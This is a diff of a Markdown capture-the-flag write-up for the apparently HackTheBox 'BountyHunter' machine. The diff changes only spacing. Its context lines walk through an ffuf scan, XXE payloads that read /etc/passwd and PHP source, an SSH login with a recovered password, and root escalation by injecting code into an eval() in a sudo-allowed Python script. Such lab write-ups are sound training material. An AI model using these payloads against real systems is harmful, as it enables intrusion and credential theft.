@@ -45,7 +45,7 @@ After identifying that port **80** was open from the Nmap scan, we navigated to 
 ![Portal Page](./img/Bounty_Hunter/xxe_page.png)
 
 ---
-
+<br>
 ### 🌐 Web Exploration
 
 While exploring the site, we discovered the following path:
@@ -55,9 +55,9 @@ While exploring the site, we discovered the following path:
 - **`log_submit.php`** → Clicking the link led us here. This page contained a form labeled:
 
 > 🧪 **Bounty Report System - Beta**
-
+<br>
 ---
-
+<br>
 ### 📝 Bug Bounty Form Structure
 
 The form consisted of several text fields that looked like this:
@@ -80,13 +80,13 @@ We used the following command to scan the webserver:
 ```bash
 ffuf -u http://10.10.11.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
 ```
-
+<br>
 This allowed us to brute-force directories and file names, particularly targeting `.php` files.
 
 
-
+<br>
 ### 📂 Discovery: `db.php`
-
+<br>
 During the scan, ffuf revealed a file named:
 
 > `db.php`
@@ -116,7 +116,7 @@ After confirming that the form on `log_submit.php` parsed user input as XML, we 
 
 🧪 First Payload – Reading /etc/passwd
 We submitted the following XML payload through Burp Suite (inside one of the text fields):
-
+<br>
 ---
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -131,7 +131,7 @@ We submitted the following XML payload through Burp Suite (inside one of the tex
 </exploit>
 ```
 ---
-
+<br>
 
 After decoding the response (which was Base64 + URL encoded), we retrieved the contents of /etc/passwd.
 
@@ -156,6 +156,7 @@ Next, we leveraged the php://filter stream wrapper to read the source code of th
 </exploit>
 ```
 ---
+<br>
 
 After decoding the response again, we found hardcoded credentials in the source code, such as:
 
@@ -189,13 +190,18 @@ ssh development@10.10.11.100
 ```
 ---
 
+<br>
+
 When prompted for the password, we entered:
+<br>
 
 ---
 ```bash
 m19RoAU0hP41A1sTsq6K
 ```
 ---
+<br>
+
 
 This successfully authenticated us as the development user on the machine.
 
@@ -212,12 +218,16 @@ User development may run the following commands on bountyhunter:
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 
 ```
+<br>
+
 ---
 
 **Ticket Validation Vulnerability**
 The code in ticketValidator.py was parsing ticket files and evaluating the ticket code. The critical part of the code was the following:
 
 ---
+<br>
+
 ```bash
 ticketCode = x.replace("**", "").split("+")[0]
 if int(ticketCode) % 7 == 4:
@@ -228,6 +238,8 @@ if int(ticketCode) % 7 == 4:
         return False
 
 ```
+<br>
+
 ---
 
 The code used the eval() function, which allowed arbitrary Python code to be executed. This presented an opportunity for code injection.
@@ -236,6 +248,8 @@ The code used the eval() function, which allowed arbitrary Python code to be exe
 To exploit this, we created a malicious ticket with a payload.md file containing the following code:
 
 ---
+<br>
+
 ```bash
 # Skytrain Inc
 ## Ticket to New Haven
@@ -246,6 +260,8 @@ __Ticket Code:__
 
 ```
 ---
+<br>
+
 
 This payload injected the command sudo /bin/bash into the ticketCode, which was then executed as root when the eval() function processed it.
 
